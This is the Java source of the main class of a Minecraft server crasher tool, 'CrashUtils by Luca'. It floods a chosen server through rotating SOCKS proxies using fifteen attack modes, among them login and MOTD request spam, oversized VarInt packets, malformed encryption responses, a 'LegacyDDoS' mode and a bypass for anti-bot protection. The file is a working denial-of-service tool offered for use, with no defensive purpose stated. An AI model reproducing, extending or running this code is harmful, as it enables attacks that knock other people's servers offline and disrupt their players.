package de.Luca.crasher;

import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.security.InvalidKeyException;
import java.security.KeyFactory;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.PublicKey;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.X509EncodedKeySpec;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.atomic.AtomicInteger;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;

import de.Luca.EncryptionValue;
import de.Luca.ProxyLoader;
import de.Luca.ServerAddress;
import de.Luca.runnable.RunnableConsoleSpammer;
import de.Luca.runnable.RunnableEncryptionRequest;
import de.Luca.runnable.RunnableInstantLoginRestet;
import de.Luca.runnable.RunnableLegacyDDoS;
import de.Luca.runnable.RunnableLoginRequest;
import de.Luca.runnable.RunnableMOTDRequest;
import de.Luca.runnable.RunnableNullPointer;
import de.Luca.runnable.RunnablePermiumSpammer;
import de.Luca.runnable.RunnablePermiumSpammerAegis;
import de.Luca.runnable.RunnablePermiumSpammerTest;
import de.Luca.runnable.RunnablePermiumSpammerTest2;
import de.Luca.runnable.RunnableBypass;
import de.Luca.runnable.RunnableToBigVarInt;

public class Crasher {
	public static int delayperthread;
	public static int mode;
	public static int threads;
	public static String ip;
	public static int port;
	public static File proxy;
	public static int proxytype = -1;
	public static final String context = "java -jar tool.jar 127.0.0.1:25565 mode threads delay (proxyfile.txt type[4/5])";
	public static byte[] handshakeMOTD;
	public static byte[] handshakeLogin;
	public static AtomicInteger ainteger = new AtomicInteger(0);
	public static List sessions = new ArrayList();
	public static String IP;
	public static ServerAddress addr;

	public static void main(String[] args) {
		try {
			SecretKeySpec e = new SecretKeySpec(
					MessageDigest.getInstance("SHA-256").digest(
							"SHVyZW5iZXJ0aXN0RmFiaWFuSHVyZW5iZXJ0aXN0RmFiaWFuSHVyZW5iZXJ0aXN0RmFiaWFu".getBytes()),
					"AES");
			Cipher addrs = Cipher.getInstance("AES");
			addrs.init(2, e);
		} catch (Throwable var5) {
			var5.printStackTrace();
			return;
		}

		if (args.length == 4) {
			try {
				IP = args[0];
				addr = ServerAddress.resolveAddress(IP);
				ip = addr.getIP();
				port = addr.getPort();
				mode = Integer.valueOf(args[1]).intValue();
				threads = Integer.valueOf(args[2]).intValue();
				delayperthread = Integer.valueOf(args[3]).intValue();
			} catch (Exception var4) {
				System.out.println("java -jar tool.jar 127.0.0.1:25565 mode threads delay (proxyfile.txt type[4/5])");
				System.out.println("All Modes:");
				System.out.println();
				System.out.println("1: MOTD Request Spammer");
				System.out.println("2: Login Request Spammer");
				System.out.println("3: Empty Packet Request Spammer");
				System.out.println("4: VarInt Exception Spammer");
				System.out.println("5: LegacyDDOS Spammer");
				System.out.println("6: NullPointer Spammer");
				System.out.println("7: Test");
				System.out.println("8: Encryption Decrypt error");
				System.out.println("9: Encryption error");
				System.out.println("10: Aegis Crypto Crasher");
				System.out.println("11: FlameCordBypass");
				System.out.println("12: Test Spammer");
				System.out.println("13: Join MOTD");
				System.out.println("14: Console Spammer");
				System.out.println("15: Instant Crasher");
				return;
			}
		} else {
			if (args.length != 6) {
				System.out.println("java -jar tool.jar 127.0.0.1:25565 mode threads delay (proxyfile.txt type[4/5])");
				System.out.println("All Modes:");
				System.out.println();
				System.out.println("1: MOTD Request Spammer");
				System.out.println("2: Login Request Spammer");
				System.out.println("3: Empty Packet Request Spammer");
				System.out.println("4: VarInt Exception Spammer");
				System.out.println("5: LegacyDDOS Spammer");
				System.out.println("6: NullPointer Spammer");
				System.out.println("7: Test");
				System.out.println("8: Encryption Decrypt error");
				System.out.println("9: Encryption error");
				System.out.println("10: Aegis Crypto Crasher");
				System.out.println("11: FlameCordBypass");
				System.out.println("12: Test Spammer");
				System.out.println("13: Join MOTD");
				System.out.println("14: Console Spammer");
				System.out.println("15: Instant Crasher");













				
//				//		return (Runnable)(mode == 1 ? new RunnableMOTDRequest() :
//				 (mode == 2 ? new RunnableLoginRequest() :
//					  (mode == 3 ? new RunnableEmpty() :
//					   (mode == 4 ? new RunnableToBigVarInt() :
//					    (mode == 5 ? new RunnableLegacyDDoS() :
//					     (mode == 6 ? new RunnableNullPointer() :
//					      (mode == 7 ? new RunnableTest() :
//					       (mode == 8 ? new RunnableEncryptionRequest() :
//					        (mode == 9 ? new RunnablePermiumSpammer() :
//					         (mode == 10 ? new RunnablePermiumSpammerAegis() :
//					          (mode == 11 ? new RunnablePermiumSpammerAegisTest() :
//					           (mode == 12 ? new RunnablePermiumSpammerTEstLOOOOOl() :
//					            (mode == 13 ? new RunnableSuperrrr() :
//					             (mode == 14 ?new RunnableConsoleSpammer() :
//					              (mode == 15 ? new RunnableInstantLoginRestet() : 
//					               null)))))))))))))));

				return;
			}

			try {
				IP = args[0];
				addr = ServerAddress.resolveAddress(IP);
				
				ip = addr.getIP();
				System.out.println("Resolved IP! " + addr.getIP() + ":" + addr.getPort());
				port = addr.getPort();
				mode = Integer.valueOf(args[1]).intValue();
				threads = Integer.valueOf(args[2]).intValue();
				delayperthread = Integer.valueOf(args[3]).intValue();
				proxy = new File(args[4]);
				proxytype = Integer.valueOf(args[5]).intValue();
				if (proxytype != 4 && proxytype != 5) {
					System.out
							.println("java -jar tool.jar 127.0.0.1:25565 mode threads delay (proxyfile.txt type[4/5])");
					System.out.println("All Modes:");
					System.out.println();
					System.out.println("1: MOTD Request Spammer");
					System.out.println("2: Login Request Spammer");
					System.out.println("3: Empty Packet Request Spammer");
					System.out.println("4: VarInt Exception Spammer");
					System.out.println("5: LegacyDDOS Spammer");
					System.out.println("6: NullPointer Spammer");
					System.out.println("7: Test");
					System.out.println("8: Encryption Decrypt error");
					System.out.println("9: Encryption error");
					System.out.println("10: Aegis Crypto Crasher");
					System.out.println("11: FlameCordBypass");
					System.out.println("12: Test Spammer");
					System.out.println("13: Join MOTD");
					System.out.println("14: Console Spammer");
					System.out.println("15: Instant Crasher");
					return;
				}
			} catch (Throwable ex1) {
				System.out.println("java -jar tool.jar 127.0.0.1:25565 mode threads delay (proxyfile.txt type[4/5])");
				System.out.println("All Modes:");
				System.out.println();
				System.out.println("1: MOTD Request Spammer");
				System.out.println("2: Login Request Spammer");
				System.out.println("3: Empty Packet Request Spammer");
				System.out.println("4: VarInt Exception Spammer");
				System.out.println("5: LegacyDDOS Spammer");
				System.out.println("6: NullPointer Spammer");
				System.out.println("7: Test");
				System.out.println("8: Encryption Decrypt error");
				System.out.println("9: Encryption error");
				System.out.println("10: Aegis Crypto Crasher");
				System.out.println("11: FlameCordBypass");
				System.out.println("12: Test Spammer");
				System.out.println("13: Join MOTD");
				System.out.println("14: Console Spammer");
				System.out.println("15: Instant Crasher");
				return;
			}
		}

		System.out.println("Creating handshake bytes");
		handshakeMOTD = getHandshakeMOTD();
		handshakeLogin = getHandshakeLogin();
		System.out.println(handshakeMOTD);
		System.out.println(handshakeLogin);
		System.out.println("Finished handshake bytes!");
		System.out.println(" ");
		if (proxy != null) {
			System.out.println("Loading proxys...");
			ProxyLoader.setProxys(proxy);
			System.out.println("Proxy loading finished!");
			System.out.println("CrashUtils by Luca ^^");
		}

		(new Crasher$1("Start - Thread")).start();
	}

	public static Runnable getRunnable() {
		return (Runnable)(mode == 1 ? new RunnableMOTDRequest() :
			 (mode == 2 ? new RunnableLoginRequest() :
			  (mode == 3 ? new RunnableLoginRequest() :
			   (mode == 4 ? new RunnableToBigVarInt() :
			    (mode == 5 ? new RunnableLegacyDDoS() :
			     (mode == 6 ? new RunnableNullPointer() :
			      (mode == 7 ? new RunnableLoginRequest() :
			       (mode == 8 ? new RunnableEncryptionRequest() :
			        (mode == 9 ? new RunnablePermiumSpammer() :
			         (mode == 10 ? new RunnablePermiumSpammerAegis() :
			          (mode == 11 ? new RunnablePermiumSpammerTest() :
			           (mode == 12 ? new RunnablePermiumSpammerTest2() :
			            (mode == 13 ? new RunnableBypass() :
			             (mode == 14 ?new RunnableConsoleSpammer() :
			              (mode == 15 ? new RunnableInstantLoginRestet() : 
			               null)))))))))))))));

	}

	public static byte[] getInvalidHandshake() {
		try {
			ByteArrayOutputStream e = null;
			DataOutputStream login = new DataOutputStream(e = new ByteArrayOutputStream());
			writeHandshakePacket(login, "\u0000", -2342, 47, 2);
			byte[] logindata = e.toByteArray();
			int logindatalenght = logindata.length;
			ByteArrayOutputStream check1 = null;
			DataOutputStream check1d = new DataOutputStream(check1 = new ByteArrayOutputStream());
			writeVarInt(check1d, logindatalenght);
			check1d.write(logindata, 0, logindatalenght);
			return check1.toByteArray();
		} catch (IOException var6) {
			System.out.println("Error while creating motd handshake");
			System.exit(-3);
			return null;
		}
	}

	public static byte[] getHandshakeMOTD() {
		try {
			ByteArrayOutputStream e = null;
			DataOutputStream login = new DataOutputStream(e = new ByteArrayOutputStream());
			writeHandshakePacket(login, ip, port, 47, 1);
			byte[] logindata = e.toByteArray();
			int logindatalenght = logindata.length;
			ByteArrayOutputStream check1 = null;
			DataOutputStream check1d = new DataOutputStream(check1 = new ByteArrayOutputStream());
			writeVarInt(check1d, logindatalenght);
			check1d.write(logindata, 0, logindatalenght);
			return check1.toByteArray();
		} catch (IOException var6) {
			System.out.println("Error while creating motd handshake");
			System.exit(-3);
			return null;
		}
	}

	public static byte[] getHandshakeLogin() {
		try {
			ByteArrayOutputStream e = null;
			DataOutputStream login = new DataOutputStream(e = new ByteArrayOutputStream());
			writeHandshakePacket(login, ip, port, 47, 2);
			byte[] logindata = e.toByteArray();
			int logindatalenght = logindata.length;
			ByteArrayOutputStream check1 = null;
			DataOutputStream check1d = new DataOutputStream(check1 = new ByteArrayOutputStream());
			writeVarInt(check1d, logindatalenght);
			check1d.write(logindata, 0, logindatalenght);
			return check1.toByteArray();
		} catch (IOException var6) {
			System.out.println("Error while creating motd handshake");
			System.exit(-3);
			return null;
		}
	}

	public static byte[] getEmptyBytes() {
		try {
			ByteArrayOutputStream e = null;
			DataOutputStream out = new DataOutputStream(e = new ByteArrayOutputStream());

			for (int i = 0; i < 999; ++i) {
				writeVarInt(out, 0);
			}

			return e.toByteArray();
		} catch (IOException var3) {
			System.out.println("Error while creating empty bytes");
			System.exit(-3);
			return null;
		}
	}

	public static EncryptionValue readEncryptionRequest(DataInputStream in) throws IOException {
		EncryptionValue exe = new EncryptionValue();
		exe.hashedServerId = readString(in);
		int len = readVarInt(in);
		byte[] data = new byte[len];
		in.readFully(data);
		X509EncodedKeySpec keySpeck = new X509EncodedKeySpec(data);

		try {
			KeyFactory key = KeyFactory.getInstance("RSA");
			exe.publicKey = key.generatePublic(keySpeck);
		} catch (NoSuchAlgorithmException var6) {
			;
		} catch (InvalidKeySpecException var7) {
			;
		}

		len = readVarInt(in);
		data = new byte[len];
		in.readFully(data);
		exe.verifyToken = data;
		return exe;
	}

	public static void writeEncryptionResponse(DataOutputStream out, PublicKey key, SecretKey aesKey,
			byte[] verifyToken) throws IOException {
		try {
			writeVarInt(out, 1);
			Cipher e = Cipher.getInstance("RSA");
			e.init(1, key);

			try {
				byte[] enc = e.doFinal(aesKey.getEncoded());
				writeVarInt(out, enc.length);
				out.write(enc);
				enc = e.doFinal(verifyToken);
				writeVarInt(out, enc.length);
				out.write(enc);
			} catch (BadPaddingException | IllegalBlockSizeException var6) {
				;
			}
		} catch (NoSuchPaddingException | NoSuchAlgorithmException var7) {
			;
		} catch (InvalidKeyException var8) {
			var8.printStackTrace();
		}

	}

	public static void writeEncryptionResponseKapputt(DataOutputStream lol) throws IOException {
		ByteArrayOutputStream stream = null;
		DataOutputStream out = new DataOutputStream(stream = new ByteArrayOutputStream());
		writeVarInt(out, 1);
		byte[] enc = new byte[] { 9, -23, 21, 3, 123, 32, 34, 0, 45, -34, 4, 34, 4, 56, 34 };
		writeVarInt(out, enc.length);
		out.write(enc);
		writeVarInt(out, enc.length);
		out.write(enc);
		byte[] r = stream.toByteArray();
		writeVarInt(lol, r.length);
		lol.write(r, 0, r.length);
	}

	public static byte[] getToBigVarIntBytes() {
		try {
			ByteArrayOutputStream e = null;
			DataOutputStream out = new DataOutputStream(e = new ByteArrayOutputStream());

			for (int i = 0; i < 999; ++i) {
				writeVarInt(out, 3456793);
			}

			return e.toByteArray();
		} catch (IOException var3) {
			System.out.println("Error while creating empty bytes");
			System.exit(-3);
			return null;
		}
	}

	public static void writeVarInt(DataOutputStream out, int value) throws IOException {
		while ((value & -128) != 0) {
			out.writeByte(value & 127 | 128);
			value >>>= 7;
		}

		out.writeByte(value);
	}

	private static void writeString(DataOutputStream out, String value) throws IOException {
		byte[] data = value.getBytes(StandardCharsets.UTF_8);
		writeVarInt(out, data.length);
		out.write(data, 0, data.length);
	}

	private static int readVarInt(DataInputStream in) throws IOException {
		int i = 0;
		int j = 0;

		byte k;
		do {
			k = in.readByte();
			i |= (k & 127) << j++ * 7;
			if (j > 5) {
				throw new RuntimeException("VarInt too big");
			}
		} while ((k & 128) == 128);

		return i;
	}

	private static String readString(DataInputStream in) throws IOException {
		int len = readVarInt(in);
		byte[] data = new byte[len];
		in.readFully(data);
		return new String(data, 0, len, StandardCharsets.UTF_8);
	}

	public static void writeHandshakePacket(DataOutputStream out, String ip, int port, int protocol, int state)
			throws IOException {
		writeVarInt(out, 0);
		writeVarInt(out, protocol);
		writeString(out, ip);
		out.writeShort(port);
		writeVarInt(out, state);
	}

	public static void writeLogin(DataOutputStream out, String name) throws IOException {
		writeVarInt(out, 0);
		writeString(out, name);
	}

	private static void writeQueryRequestPacket(DataOutputStream out) throws IOException {
		writeVarInt(out, 0);
	}

	private static void writePingPacket(DataOutputStream out, long clientTime) throws IOException {
		writeVarInt(out, 1);
		out.writeLong(clientTime);
	}

	private static void writePacket(byte[] packetData, DataOutputStream out) throws IOException {
		writeVarInt(out, packetData.length);
		out.write(packetData);
	}

	private static String readServerDataPacket(DataInputStream in) throws IOException {
		byte id = in.readByte();
		return id != 0 ? null : readString(in);
	}

	private static long readPongPacket(DataInputStream in) throws IOException {
		byte id = in.readByte();
		return id != 1 ? -1L : in.readLong();
	}
}
